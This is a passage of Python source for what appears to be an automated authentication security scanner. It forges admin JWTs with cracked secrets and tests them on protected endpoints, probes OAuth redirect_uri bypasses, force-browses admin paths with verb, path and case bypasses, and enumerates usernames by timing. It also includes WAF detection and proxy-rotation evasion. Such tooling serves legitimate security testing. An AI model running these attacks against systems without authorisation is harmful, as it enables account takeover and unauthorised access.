                        "secret_prefix": secret[:8],
                        "forged_token_prefix": forged[:80] + "…",
                        "note": "Manually test forged token against protected endpoints",
                    },
                    remediation="Rotate HMAC secret immediately",
                    tech=tech, chain_id="jwt-forgery",
                    auth_enabled=auth_on, first_seen=now_iso,
                ))
                continue

            # Test forged token against protected endpoint
            r = session.request(
                "GET", protected,
                headers={"Authorization": f"Bearer {forged}"},
            )
            accepted = r is not None and r.status_code == 200

            if accepted:
                body_len = len(r.content) if r is not None else 0
                forgery_chain_findings.append(AuthFinding(
                    target=protected, vuln_type="jwt_forgery_confirmed",
                    category="jwt", severity=Severity.CRITICAL, confidence=95,
                    evidence=(
                        f"Forged admin JWT accepted by {protected} "
                        f"(HTTP 200, {body_len} bytes returned)"
                    ),
                    details={
                        "secret_prefix": secret[:8],
                        "forged_token_prefix": forged[:80] + "…",
                        "protected_endpoint": protected,
                        "response_status": r.status_code,
                        "response_bytes": body_len,
                        "claims_injected": [c for c, _ in JWT_ADMIN_CLAIMS.get(tech, [])],
                    },
                    remediation="Rotate secret; enforce claim validation; add audience checks",
                    tech=tech, chain_id="jwt-forgery", confirmed=True,
                    auth_enabled=auth_on, first_seen=now_iso,
                ))
                log.info(f"      ✓ JWT forgery chain CONFIRMED against {protected}")
            else:
                status = r.status_code if r is not None else "no-response"
                forgery_chain_findings.append(AuthFinding(
                    target=protected or url, vuln_type="jwt_forgery_ready",
                    category="jwt", severity=Severity.HIGH, confidence=75,
                    evidence=(
                        f"Weak secret cracked but forged token rejected "
                        f"by {protected} (HTTP {status})"
                    ),
                    details={
                        "secret_prefix": secret[:8],
                        "rejection_status": status,
                    },
                    remediation="Rotate secret; investigate claim validation",
                    tech=tech, chain_id="jwt-forgery", confirmed=False,
                    auth_enabled=auth_on, first_seen=now_iso,
                ))

    findings.extend(forgery_chain_findings)

    # Write JWT flat file
    jwt_lines = [
        f"{f.target}\t{f.vuln_type}\t{f.severity.value}\t{f.confidence}\t{f.evidence[:120]}"
        for f in findings
    ]
    (outdir / "jwt_candidates.txt").write_text(
        "\n".join(jwt_lines) + ("\n" if jwt_lines else "")
    )
    return findings


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 3 — OAUTH
# ═════════════════════════════════════════════════════════════════════════════

def test_oauth_endpoints(
    oauth_urls: list[str], session: EvasionSession, auth_on: bool,
) -> list[AuthFinding]:
    findings: list[AuthFinding] = []
    if not oauth_urls:
        return findings
    now_iso = datetime.now(timezone.utc).isoformat()

    log.info(f"  Testing {len(oauth_urls)} OAuth endpoint(s)...")

    for url in oauth_urls[:50]:
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)

        # Missing state
        if "response_type" in params and "state" not in params:
            findings.append(AuthFinding(
                target=url, vuln_type="oauth_missing_state", category="oauth",
                severity=Severity.HIGH, confidence=85,
                evidence="OAuth authorize endpoint has no state parameter",
                details={"params": list(params.keys())},
                remediation="Require state parameter; bind to user session",
                auth_enabled=auth_on, first_seen=now_iso,
            ))

        # redirect_uri bypass — validated (must 3xx + different host)
        original_redirect = params.get("redirect_uri", [None])[0]
        if original_redirect:
            for payload in OAUTH_REDIRECT_PAYLOADS:
                test_params = {k: v[0] for k, v in params.items()}
                test_params["redirect_uri"] = payload
                test_url = urllib.parse.urlunparse(
                    parsed._replace(query=urllib.parse.urlencode(test_params))
                )
                resp = session.get(test_url)
                if resp and resp.status_code in (301, 302, 303, 307, 308):
                    location = resp.headers.get("Location", "")
                    orig_host = _extract_host(original_redirect)
                    new_host = _extract_host(location)
                    # Only flag if the redirect actually left the origin
                    if new_host and new_host != orig_host:
                        findings.append(AuthFinding(
                            target=url, vuln_type="oauth_redirect_bypass",
                            category="oauth",
                            severity=Severity.CRITICAL, confidence=90,
                            evidence=f"redirect_uri accepted: {payload} → {location[:80]}",
                            details={
                                "payload": payload,
                                "original_redirect": original_redirect,
                                "response_location": location[:200],
                            },
                            remediation="Strictly validate redirect_uri against allow-list",
                            chain_id="oauth-leak", confirmed=True,
                            auth_enabled=auth_on, first_seen=now_iso,
                        ))
                        break

        # PKCE downgrade
        if "code_challenge" in params and "code_challenge_method" not in params:
            findings.append(AuthFinding(
                target=url, vuln_type="oauth_pkce_downgrade", category="oauth",
                severity=Severity.MEDIUM, confidence=60,
                evidence="code_challenge present without code_challenge_method",
                details={"params": list(params.keys())},
                remediation="Enforce S256 for code_challenge_method",
                auth_enabled=auth_on, first_seen=now_iso,
            ))

        # Implicit flow
        if "response_type" in params and "token" in params.get("response_type", []):
            findings.append(AuthFinding(
                target=url, vuln_type="oauth_implicit_flow", category="oauth",
                severity=Severity.MEDIUM, confidence=70,
                evidence="OAuth uses implicit flow (token in URL fragment)",
                details={"response_type": params["response_type"]},
                remediation="Use authorization code flow with PKCE",
                auth_enabled=auth_on, first_seen=now_iso,
            ))

    # Write OAuth flat file
    lines = [
        f"{f.target}\t{f.vuln_type}\t{f.severity.value}\t{f.confidence}\t{f.evidence[:120]}"
        for f in findings
    ]
    return findings


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 4 — SAML
# ═════════════════════════════════════════════════════════════════════════════

def test_saml_endpoints(
    urls: list[str], session: EvasionSession, auth_on: bool,
) -> list[AuthFinding]:
    findings: list[AuthFinding] = []
    saml_urls = [u for u in urls if SAML_ENDPOINT_RE.search(urllib.parse.urlparse(u).path)]
    if not saml_urls:
        return findings
    now_iso = datetime.now(timezone.utc).isoformat()

    log.info(f"  Identified {len(saml_urls)} SAML-related endpoint(s)")

    for url in saml_urls[:30]:
        for meta_path in ("/saml/metadata", "/metadata", "/saml2/metadata", "/idp/metadata"):
            test_url = urllib.parse.urljoin(url, meta_path)
            resp = session.get(test_url)
            if resp and resp.status_code == 200 and "xml" in resp.headers.get("Content-Type", "").lower():
                findings.append(AuthFinding(
                    target=test_url, vuln_type="saml_metadata_exposed", category="saml",
                    severity=Severity.MEDIUM, confidence=80,
                    evidence="SAML metadata is publicly accessible",
                    details={"content_type": resp.headers.get("Content-Type")},
                    remediation="Restrict metadata to authorized IdPs/SPs",
                    auth_enabled=auth_on, first_seen=now_iso,
                ))

        findings.append(AuthFinding(
            target=url, vuln_type="saml_xsw_surface", category="saml",
            severity=Severity.HIGH, confidence=40,
            evidence=(f"SAML endpoint identified — test {len(SAML_XSW_VARIANTS)} XSW variants: "
                      f"{', '.join(SAML_XSW_VARIANTS[:4])}…"),
            details={"xsw_variants": SAML_XSW_VARIANTS},
            remediation="Use hardened SAML library; validate signature reference",
            auth_enabled=auth_on, first_seen=now_iso,
        ))

    # Write SAML flat file
    lines = [
        f"{f.target}\t{f.vuln_type}\t{f.severity.value}\t{f.confidence}\t{f.evidence[:120]}"
        for f in findings
    ]
    return findings


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 5 — SESSION & COOKIE SECURITY
# ═════════════════════════════════════════════════════════════════════════════

def _looks_like_session_cookie(name: str) -> bool:
    n = name.lower()
    return any(hint in n for hint in SESSION_COOKIE_HINTS)


def _parse_set_cookie_attrs(set_cookie_header: str) -> dict:
    parts = [p.strip() for p in set_cookie_header.split(";")]
    if not parts or "=" not in parts[0]:
        return {}
    name, value = parts[0].split("=", 1)
    attrs: dict[str, str] = {}
    for p in parts[1:]:
        if "=" in p:
            k, v = p.split("=", 1)
            attrs[k.strip().lower()] = v.strip()
        elif p:
            attrs[p.strip().lower()] = ""
    return {"name": name.strip(), "value": value, "attrs": attrs}


def _entropy_bits(value: str) -> float:
    """Shannon entropy per char × length = approximate bits of randomness."""
    if not value:
        return 0.0
    freq: dict[str, int] = {}
    for c in value:
        freq[c] = freq.get(c, 0) + 1
    n = len(value)
    h = -sum((cnt / n) * (cnt / n and __import__("math").log2(cnt / n))
             for cnt in freq.values())
    return h * n


def _collect_set_cookies(resp: requests.Response) -> list[str]:
    out: list[str] = []
    try:
        out = resp.raw.headers.getlist("Set-Cookie")
    except Exception:
        sc = resp.headers.get("Set-Cookie", "")
        if sc:
            out = [sc]
    return out


def test_cookie_security(
    urls: list[str], session: EvasionSession, auth_on: bool,
) -> list[AuthFinding]:
    findings: list[AuthFinding] = []
    now_iso = datetime.now(timezone.utc).isoformat()
    log.info("  Analyzing cookie security on auth endpoints...")

    auth_urls = [u for u in urls
                 if re.search(r"/(login|signin|auth|session|dashboard|account)", u, re.I)][:30]
    seen: set[tuple[str, str]] = set()

    for url in auth_urls:
        resp = session.get(url)
        if not resp:
            continue
        for sc in _collect_set_cookies(resp):
            parsed = _parse_set_cookie_attrs(sc)
            if not parsed:
                continue
            name, attrs = parsed["name"], parsed["attrs"]
            if not _looks_like_session_cookie(name):
                continue

            key = (url, name)
            if key in seen:
                continue
            seen.add(key)

            missing: list[str] = []
            if "httponly" not in attrs:
                missing.append("HttpOnly")
            if "secure" not in attrs and url.startswith("https://"):
                missing.append("Secure")
            same_site = attrs.get("samesite", "").lower()
            if not same_site:
                missing.append("SameSite")
            elif same_site == "none" and "secure" not in attrs:
                missing.append("SameSite=None_without_Secure")

            # Cookie prefix misuse
            prefix_issues: list[str] = []
            if name.startswith("__Host-"):
                if "secure" not in attrs or "path" not in attrs or attrs.get("path") != "/":
                    prefix_issues.append("__Host- requires Secure, Path=/, no Domain")
                elif "domain" in attrs:
                    prefix_issues.append("__Host- must not set Domain")
            if name.startswith("__Secure-") and "secure" not in attrs:
                prefix_issues.append("__Secure- requires Secure")

            if missing or prefix_issues:
                sev = Severity.HIGH if "HttpOnly" in missing or "Secure" in missing \
                     else Severity.MEDIUM
                evidence_parts = []
                if missing:
                    evidence_parts.append(f"missing: {', '.join(missing)}")
                if prefix_issues:
                    evidence_parts.append(f"prefix: {'; '.join(prefix_issues)}")
                findings.append(AuthFinding(
                    target=url, vuln_type="cookie_missing_security_attrs",
                    category="cookie", severity=sev, confidence=80,
                    evidence=f"Session cookie '{name}' — {' | '.join(evidence_parts)}",
                    details={"cookie_name": name, "cookie_attrs": attrs,
                             "missing_attrs": missing, "prefix_issues": prefix_issues},
                    remediation="Set HttpOnly, Secure, SameSite=Strict/Lax on session cookies",
                    auth_enabled=auth_on, first_seen=now_iso,
                ))

            # Weak cookie value (low entropy)
            ent = _entropy_bits(parsed["value"])
            if len(parsed["value"]) > 4 and ent < 32:
                findings.append(AuthFinding(
                    target=url, vuln_type="cookie_low_entropy", category="cookie",
                    severity=Severity.MEDIUM, confidence=60,
                    evidence=f"Session cookie '{name}' has low entropy ({ent:.0f} bits)",
                    details={"cookie_name": name, "entropy_bits": round(ent, 1),
                             "value_length": len(parsed["value"])},
                    remediation="Use cryptographically random session identifiers",
                    auth_enabled=auth_on, first_seen=now_iso,
                ))

    return findings


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 6 — CSRF
# ═════════════════════════════════════════════════════════════════════════════

FORM_RE = re.compile(r'<form\b[^>]*\bmethod\s*=\s*["\']?post["\']?[^>]*>.*?</form>',
                     re.I | re.DOTALL)
FORM_INPUT_RE = re.compile(r'<input\b[^>]*\bname\s*=\s*["\']([^"\']+)["\']', re.I)


def test_csrf_protection(
    urls: list[str], session: EvasionSession, auth_on: bool,
) -> list[AuthFinding]:
    findings: list[AuthFinding] = []
    now_iso = datetime.now(timezone.utc).isoformat()
    log.info("  Analyzing CSRF protection on state-changing forms...")

    state_urls = [u for u in urls
                  if re.search(r"/(login|register|signup|password|account|settings|profile|admin)", u, re.I)][:30]

    for url in state_urls:
        resp = session.get(url)
        if not resp:
            continue

        # Capture session cookies on this page for chain correlation
        session_cookies: dict[str, dict] = {}
        for sc in _collect_set_cookies(resp):
            parsed = _parse_set_cookie_attrs(sc)
            if parsed and _looks_like_session_cookie(parsed["name"]):
                session_cookies[parsed["name"]] = parsed["attrs"]

        try:
            body = resp.text[:200000]
        except Exception:
            continue

        for form_match in FORM_RE.finditer(body):
            form_html = form_match.group(0)
            field_names = [m.group(1).lower() for m in FORM_INPUT_RE.finditer(form_html)]
            has_csrf = any(any(h in f for h in CSRF_FIELD_HINTS) for f in field_names)

            if has_csrf:
                # Check token entropy if we can extract the value
                token_re = re.compile(
                    r'<input\b[^>]*\bname\s*=\s*["\']([^"\']*(?:csrf|token|xsrf)[^"\']*)["\'][^>]*\bvalue\s*=\s*["\']([^"\']+)["\']',
                    re.I,
                )
                for tm in token_re.finditer(form_html):
                    token_val = tm.group(2)
                    ent = _entropy_bits(token_val)
                    if len(token_val) >= 8 and ent < 40:
                        findings.append(AuthFinding(
                            target=url, vuln_type="csrf_low_entropy_token",
                            category="csrf", severity=Severity.MEDIUM, confidence=55,
                            evidence=f"CSRF token '{tm.group(1)}' has low entropy ({ent:.0f} bits)",
                            details={"field": tm.group(1),
                                     "entropy_bits": round(ent, 1),
                                     "length": len(token_val)},
                            remediation="Generate CSRF tokens with ≥128 bits of entropy",
                            auth_enabled=auth_on, first_seen=now_iso,
                        ))
                break

            # No CSRF token — correlate with SameSite to determine severity
            weakest_same_site = None
            for name, attrs in session_cookies.items():
                ss = attrs.get("samesite", "").lower()
                if ss == "none" or ss == "":
                    weakest_same_site = ss or "unset"
                    break
                weakest_same_site = ss

            if weakest_same_site in ("none", "unset", None):
                # CHAIN CONFIRMED: missing token + weak SameSite
                findings.append(AuthFinding(
                    target=url, vuln_type="csrf_chain_confirmed", category="csrf",
                    severity=Severity.HIGH, confidence=80,
                    evidence=(
                        f"POST form without CSRF token AND session cookie "
                        f"SameSite={weakest_same_site or 'unset'} — exploitable CSRF"
                    ),
                    details={
                        "form_fields": field_names[:20],
                        "session_cookies": list(session_cookies.keys()),
                        "same_site": weakest_same_site or "unset",
                    },
                    remediation="Add CSRF token and set SameSite=Lax/Strict",
                    chain_id="csrf-chain", confirmed=True,
                    auth_enabled=auth_on, first_seen=now_iso,
                ))
            else:
                # Missing token but SameSite mitigates
                findings.append(AuthFinding(
                    target=url, vuln_type="csrf_missing_token_form", category="csrf",
                    severity=Severity.MEDIUM, confidence=60,
                    evidence=(f"POST form without CSRF token "
                              f"(SameSite={weakest_same_site} mitigates)"),
                    details={"form_fields": field_names[:20],
                             "same_site": weakest_same_site},
                    remediation="Defense-in-depth: add CSRF token even with SameSite",
                    auth_enabled=auth_on, first_seen=now_iso,
                ))
            break

    # Token-in-URL detection
    log.info("  Checking for tokens exposed in URLs...")
    for url in urls[:100]:
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        for k, vals in params.items():
            if any(hint in k.lower() for hint in ("token", "access_token", "jwt", "api_key", "apikey")):
                for v in vals:
                    if len(v) >= 16:
                        findings.append(AuthFinding(
                            target=url, vuln_type="token_in_url", category="general",
                            severity=Severity.MEDIUM, confidence=70,
                            evidence=f"Token-like parameter in URL: {k}",
                            details={"param": k, "value_len": len(v)},
                            remediation="Move tokens to Authorization header or POST body",
                            auth_enabled=auth_on, first_seen=now_iso,
                        ))
                        break

    return findings


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 7 — BYPASS MATRIX (PATHS + VERBS + CASE + ENCODINGS)
# ═════════════════════════════════════════════════════════════════════════════

def test_auth_bypass_matrix(
    urls: list[str], session: EvasionSession, auth_on: bool,
) -> list[AuthFinding]:
    findings: list[AuthFinding] = []
    now_iso = datetime.now(timezone.utc).isoformat()
    log.info("  Testing force-browse paths + bypass matrix...")

    hosts = sorted({_extract_host(u) for u in urls if _extract_host(u)})

    for host in hosts[:15]:
        base = f"https://{host}"

        # 1. Plain admin paths
        for path in ADMIN_PATH_PATTERNS:
            test_url = base + path
            resp = session.get(test_url)
            if not resp:
                continue
            if resp.status_code == 200:
                findings.append(AuthFinding(
                    target=test_url, vuln_type="admin_endpoint_exposed",
                    category="general", severity=Severity.HIGH, confidence=75,
                    evidence=f"HTTP 200 on admin path {path}",
                    details={"status": resp.status_code, "path": path},
                    remediation="Enforce authentication on admin routes",
                    auth_enabled=auth_on, first_seen=now_iso,
                ))
            elif resp.status_code in (401, 403):
                # Path is protected — good. Now try bypasses.
                bypass_hits = _try_verb_and_path_bypass(
                    session, base, path, auth_on, now_iso,
                )
                findings.extend(bypass_hits)

    # Default cred candidates
    login_urls = [u for u in urls if "/login" in u or "/signin" in u]
    for url in login_urls[:10]:
        findings.append(AuthFinding(
            target=url, vuln_type="default_credential_candidate",
            category="general", severity=Severity.MEDIUM, confidence=30,
            evidence="Login endpoint identified; test default credentials manually",
            remediation="Enforce password policy; disable default accounts",
            auth_enabled=auth_on, first_seen=now_iso,
        ))

    return findings


def _try_verb_and_path_bypass(
    session: EvasionSession, base: str, protected_path: str,
    auth_on: bool, now_iso: str,
) -> list[AuthFinding]:
    findings: list[AuthFinding] = []
    full_url = base + protected_path

    # Verb tampering — if we got 401/403 on GET, try HEAD/OPTIONS/PUT
    for verb in BYPASS_VERBS:
        resp = session.request(verb, full_url)
        if resp and resp.status_code == 200:
            findings.append(AuthFinding(
                target=full_url, vuln_type="verb_tampering_bypass", category="general",
                severity=Severity.HIGH, confidence=70,
                evidence=f"{verb} returns HTTP 200 while GET returns 401/403",
                details={"verb": verb, "status": resp.status_code},
                remediation="Enforce auth on ALL HTTP methods",
                chain_id="verb-bypass", confirmed=True,
                auth_enabled=auth_on, first_seen=now_iso,
            ))

    # Path traversal bypasses
    for template in PATH_BYPASS_TEMPLATES[:6]:
        bypass = template.format(p=protected_path)
        test_url = base + bypass
        resp = session.get(test_url)
        if resp and resp.status_code == 200:
            findings.append(AuthFinding(
                target=test_url, vuln_type="path_normalization_bypass",
                category="general", severity=Severity.HIGH, confidence=65,
                evidence=f"Path bypass '{bypass}' returned HTTP 200",
                details={"bypass": bypass},
                remediation="Normalize paths before auth checks",
                chain_id="verb-bypass", confirmed=True,
                auth_enabled=auth_on, first_seen=now_iso,
            ))
            break

    # Case variation
    for case_path in _case_variants(protected_path)[:4]:
        test_url = base + case_path
        resp = session.get(test_url)
        if resp and resp.status_code == 200:
            findings.append(AuthFinding(
                target=test_url, vuln_type="case_sensitivity_bypass",
                category="general", severity=Severity.HIGH, confidence=60,
                evidence=f"Case variant '{case_path}' returned HTTP 200",
                details={"case_path": case_path},
                remediation="Enforce case-insensitive auth on protected routes",
                chain_id="verb-bypass", confirmed=True,
                auth_enabled=auth_on, first_seen=now_iso,
            ))
            break

    # X-HTTP-Method-Override
    resp = session.request(
        "GET", full_url,
        headers={"X-HTTP-Method-Override": "GET",
                 "X-Original-Method": "POST"},
    )
    # Not a strong signal alone — only report if it clearly bypasses

    return findings


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 8 — ACCOUNT SECURITY (aggressive only)
# ═════════════════════════════════════════════════════════════════════════════

def test_account_security(
    urls: list[str], session: EvasionSession, auth_on: bool, aggressive: bool,
) -> list[AuthFinding]:
    findings: list[AuthFinding] = []
    if not aggressive:
        log.info("  Aggressive account tests: DISABLED (use --aggressive)")
        return findings
    now_iso = datetime.now(timezone.utc).isoformat()
    log.info("  Testing account security (aggressive)...")

    login_urls = [u for u in urls if "/login" in u or "/signin" in u][:3]
    for login_url in login_urls:
        # Username enumeration via timing
        try:
            valid_times, invalid_times = [], []
            for u in USERNAME_ENUM_VALID_USERS[:3]:
                t0 = time.monotonic()
                session.post(login_url, data={"username": u, "password": "wrong"})
                valid_times.append((time.monotonic() - t0) * 1000)
            for u in USERNAME_ENUM_INVALID_USERS[:3]:
                t0 = time.monotonic()
                session.post(login_url, data={"username": u, "password": "wrong"})
                invalid_times.append((time.monotonic() - t0) * 1000)

            if valid_times and invalid_times:
                v_mean = statistics.mean(valid_times)
                i_mean = statistics.mean(invalid_times)
                diff_pct = abs(v_mean - i_mean) / max(v_mean, i_mean, 1) * 100
                if diff_pct >= 15:
                    findings.append(AuthFinding(
                        target=login_url, vuln_type="username_enumeration_timing",
                        category="general", severity=Severity.MEDIUM, confidence=55,
                        evidence=(f"Timing difference {diff_pct:.1f}% "
                                  f"(valid μ={v_mean:.0f}ms vs invalid μ={i_mean:.0f}ms)"),
                        details={"valid_mean_ms": round(v_mean, 1),
                                 "invalid_mean_ms": round(i_mean, 1),
                                 "diff_pct": round(diff_pct, 1)},
                        remediation="Use constant-time comparison; unify error messages",
                        auth_enabled=auth_on, first_seen=now_iso,
                    ))
        except Exception as e:
            log.debug(f"enumeration test failed: {e}")

    return findings


# ═════════════════════════════════════════════════════════════════════════════
#  PHASE 9 — CHAIN AGGREGATION
# ═════════════════════════════════════════════════════════════════════════════

def build_chains(findings: list[AuthFinding]) -> list[AuthChain]:
    """Aggregate findings into structured chain records."""
    chains: list[AuthChain] = []
    by_chain: dict[str, list[AuthFinding]] = {}

    for f in findings:
        if f.chain_id:
            by_chain.setdefault(f.chain_id, []).append(f)

    NAMES = {
        "jwt-forgery":      "Weak JWT secret → forged admin token",
        "oauth-leak":       "OAuth redirect_uri bypass → token leakage",
        "csrf-chain":       "CSRF missing token + SameSite=None",
        "verb-bypass":      "Auth bypass via verb/path normalization",
        "cookie-xss":       "HttpOnly missing + XSS surface present",
    }

    for chain_id, chain_findings in by_chain.items():
        max_sev = max(chain_findings, key=lambda f: f.severity.rank).severity
        confirmed = any(f.confirmed for f in chain_findings)
        chains.append(AuthChain(
            chain_id=chain_id,
            name=NAMES.get(chain_id, chain_id),
            severity=max_sev if confirmed else Severity.MEDIUM,
            steps=[f.evidence for f in chain_findings],
            finding_hashes=[f.finding_hash for f in chain_findings],
            evidence=chain_findings[0].evidence if chain_findings else "",
        ))

    return chains


# ═════════════════════════════════════════════════════════════════════════════
#  DB SYNC
# ═════════════════════════════════════════════════════════════════════════════

def _self_sync(scan_id: int, findings: list[AuthFinding]) -> None:
    if not findings or not DB_AVAILABLE or DB is None:
        return
    if not _cfg("SYNC_TO_DB", True) or not _cfg("BRIDGE_ENABLED", False):
        return
    if not getattr(DB, "available", False):
        return
    try:
        result = DB.upsert_auth_findings(scan_id, [f.to_dict() for f in findings])
        if result is not None:
            log.info(f"  DB sync: {result} auth finding(s) upserted (scan_id={scan_id})")
    except Exception as e:
        log.warning(f"  DB sync: exception — {e}")


# ═════════════════════════════════════════════════════════════════════════════
#  PUBLIC ENTRY POINT
# ═════════════════════════════════════════════════════════════════════════════

def run_auth_tester(
    live_urls_file: Path,
    outdir: Path,
    *,
    rate_limit: Optional[int] = None,
    concurrency: Optional[int] = None,
    headers: Optional[dict] = None,
    test_jwt: bool = True,
    test_oauth: bool = True,
    test_saml: bool = True,
    test_bypass: bool = True,
    test_cookies: bool = True,
    test_csrf: bool = True,
    aggressive: bool = False,
    proxies: Optional[list[str]] = None,
    scan_id: Optional[int] = None,
) -> Path:
    start = time.monotonic()

    settings = _auth_settings()
    eff_rate = rate_limit if rate_limit is not None else settings["rate_limit"]
    eff_conc = concurrency if concurrency is not None else settings["concurrency"]
    eff_timeout = settings["timeout"]
    eff_jitter = settings["jitter"]
    eff_proxies = proxies if proxies is not None else list(settings["proxies"])

    urls = _load_urls(live_urls_file)
    outdir.mkdir(parents=True, exist_ok=True)
    auth_on = bool(_cfg("AUTH_ENABLED", False))

    log.info(f"  Input  : {len(urls)} URL(s) from {live_urls_file.name}")
    log.info(f"  Config : rate_limit={eff_rate}/s  jitter={eff_jitter}s  "
             f"concurrency={eff_conc}  timeout={eff_timeout}s")
    log.info(f"  Auth   : {'enabled' if auth_on else 'disabled'}")
    log.info(f"  Mode   : {'AGGRESSIVE' if aggressive else 'safe (passive)'}")
    if eff_proxies:
        log.info(f"  Proxies: {len(eff_proxies)} (rotation)")
    log.info("")

    if not urls:
        log.warning("  No URLs — writing empty report")
        return _write_empty(outdir, live_urls_file, start)

    profile = EvasionProfile(
        rate_limit=eff_rate, jitter=eff_jitter, proxies=eff_proxies,
    )
    all_findings: list[AuthFinding] = []

    with EvasionSession(profile=profile, timeout=eff_timeout) as session:
        # ── Phase 0: WAF + tech fingerprint ─────────────────────────────────
        log.info("  Phase 0 — Technology fingerprinting")
        waf = detect_waf(session, urls[0])
        if waf.vendor != "unknown":
            log.info(f"    WAF      : {waf.vendor} (confidence {waf.confidence}%)")
            # Adapt pacing for WAF
            session.profile.rate_limit = max(0.5, eff_rate * 0.6)
            session.profile.jitter = max(eff_jitter, 1.0)
        else:
            log.info(f"    WAF      : not detected")

        tech, tech_findings = phase0_fingerprint(urls, session, auth_on, waf)
        all_findings.extend(tech_findings)
        log.info(f"    Auth tech: {tech}")

        # ── Phase 1: Surface discovery ──────────────────────────────────────
        log.info("")
        log.info("  Phase 1 — Auth surface discovery")
        endpoints = discover_auth_endpoints(urls)
        for cat, urls_cat in endpoints.items():
            if cat != "all" and urls_cat:
                log.info(f"    {cat:<10}: {len(urls_cat)} endpoint(s)")

        # ── Phase 2: JWT + forgery chain ────────────────────────────────────
        if test_jwt:
            log.info("")
            log.info("  Phase 2 — JWT analysis + forgery chain")
            jwt_findings = run_jwt_analysis(urls, session, outdir, auth_on,
                                            eff_conc, tech=tech)
            all_findings.extend(jwt_findings)
            log.info(f"    {len(jwt_findings)} JWT finding(s)")

        # ── Phase 3: OAuth ──────────────────────────────────────────────────
        if test_oauth and endpoints.get("oauth"):
            log.info("")
            log.info("  Phase 3 — OAuth testing")
            oauth_findings = test_oauth_endpoints(endpoints["oauth"], session, auth_on)
            all_findings.extend(oauth_findings)
            log.info(f"    {len(oauth_findings)} OAuth finding(s)")
            oauth_lines = [
                f"{f.target}\t{f.vuln_type}\t{f.severity.value}\t{f.confidence}\t{f.evidence[:120]}"
                for f in oauth_findings
            ]
            (outdir / "oauth_candidates.txt").write_text(
                "\n".join(oauth_lines) + ("\n" if oauth_lines else "")
            )

        # ── Phase 4: SAML ───────────────────────────────────────────────────
        if test_saml:
            log.info("")
            log.info("  Phase 4 — SAML surface analysis")
            saml_findings = test_saml_endpoints(urls, session, auth_on)
            all_findings.extend(saml_findings)
            log.info(f"    {len(saml_findings)} SAML finding(s)")
            saml_lines = [
                f"{f.target}\t{f.vuln_type}\t{f.severity.value}\t{f.confidence}\t{f.evidence[:120]}"
                for f in saml_findings
            ]
            (outdir / "saml_candidates.txt").write_text(
                "\n".join(saml_lines) + ("\n" if saml_lines else "")
            )

        # ── Phase 5: Cookies ────────────────────────────────────────────────
        if test_cookies:
            log.info("")
            log.info("  Phase 5 — Cookie security")
            cookie_findings = test_cookie_security(urls, session, auth_on)
            all_findings.extend(cookie_findings)
            log.info(f"    {len(cookie_findings)} cookie finding(s)")

        # ── Phase 6: CSRF ───────────────────────────────────────────────────
        if test_csrf:
            log.info("")
            log.info("  Phase 6 — CSRF analysis + chain correlation")
            csrf_findings = test_csrf_protection(urls, session, auth_on)
            all_findings.extend(csrf_findings)
            log.info(f"    {len(csrf_findings)} CSRF finding(s)")

        # ── Phase 7: Bypass matrix ──────────────────────────────────────────
        if test_bypass:
            log.info("")
            log.info("  Phase 7 — Auth bypass matrix (paths, verbs, case)")
            bypass_findings = test_auth_bypass_matrix(urls, session, auth_on)
            all_findings.extend(bypass_findings)
            log.info(f"    {len(bypass_findings)} bypass finding(s)")

        # ── Phase 8: Account security (aggressive only) ─────────────────────
        log.info("")
        log.info("  Phase 8 — Account security")
        acct_findings = test_account_security(urls, session, auth_on, aggressive)
        all_findings.extend(acct_findings)
        log.info(f"    {len(acct_findings)} account finding(s)")

    # ── Phase 9: Chain aggregation ──────────────────────────────────────────
    log.info("")
    log.info("  Phase 9 — Chain aggregation")
    chains = build_chains(all_findings)
    log.info(f"    {len(chains)} chain(s) confirmed")

    # ── Dedupe + sort ───────────────────────────────────────────────────────
    seen: set[tuple] = set()
    deduped: list[AuthFinding] = []
    for f in all_findings:
        key = (f.target, f.vuln_type)
        if key not in seen:
            seen.add(key)
            deduped.append(f)
    deduped.sort(key=lambda f: (-f.severity.rank, -f.confidence, f.target))

    # ── Reports ─────────────────────────────────────────────────────────────
    elapsed = time.monotonic() - start
    by_sev: dict[str, int] = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
    by_type: dict[str, int] = {}
    by_cat: dict[str, int] = {}
    for f in deduped:
        by_sev[f.severity.value] = by_sev.get(f.severity.value, 0) + 1
        by_type[f.vuln_type] = by_type.get(f.vuln_type, 0) + 1
        by_cat[f.category] = by_cat.get(f.category, 0) + 1

    # Full findings report
    report = {
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "elapsed_seconds": round(elapsed, 2),
        "input_file": str(live_urls_file),
        "auth_enabled": auth_on,
        "aggressive": aggressive,
        "config": {
            "rate_limit": eff_rate,
            "jitter":     eff_jitter,
            "timeout":    eff_timeout,
            "proxies":    len(eff_proxies),
            "waf_vendor": waf.vendor if 'waf' in locals() else "unknown",
            "tech":       tech if 'tech' in locals() else "unknown",
        },
        "totals": {
            "urls_scanned":   len(urls),
            "total_findings": len(deduped),
            "confirmed":      sum(1 for f in deduped if _is_confirmed(f.severity)),
            "critical":       by_sev["CRITICAL"],
            "high":           by_sev["HIGH"],
            "medium":         by_sev["MEDIUM"],
            "low":            by_sev["LOW"],
            "info":           by_sev["INFO"],
        },
        "summary": {
            "by_severity": by_sev,
            "by_type":     dict(sorted(by_type.items(), key=lambda kv: -kv[1])),
            "by_category": dict(sorted(by_cat.items(), key=lambda kv: -kv[1])),
        },
        "findings": [f.to_dict() for f in deduped],
    }
    json_path = outdir / "auth_findings.json"
    json_path.write_text(json.dumps(report, indent=2, ensure_ascii=False) + "\n")

    # Confirmed-only report
    confirmed_findings = [f for f in deduped if _is_confirmed(f.severity) or f.confirmed]
    confirmed_report = {
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "input_file": str(live_urls_file),
        "totals": {
            "confirmed": len(confirmed_findings),
            "critical":  sum(1 for f in confirmed_findings if f.severity == Severity.CRITICAL),
            "high":      sum(1 for f in confirmed_findings if f.severity == Severity.HIGH),
        },
        "findings": [f.to_dict() for f in confirmed_findings],
    }
    (outdir / "auth_confirmed.json").write_text(
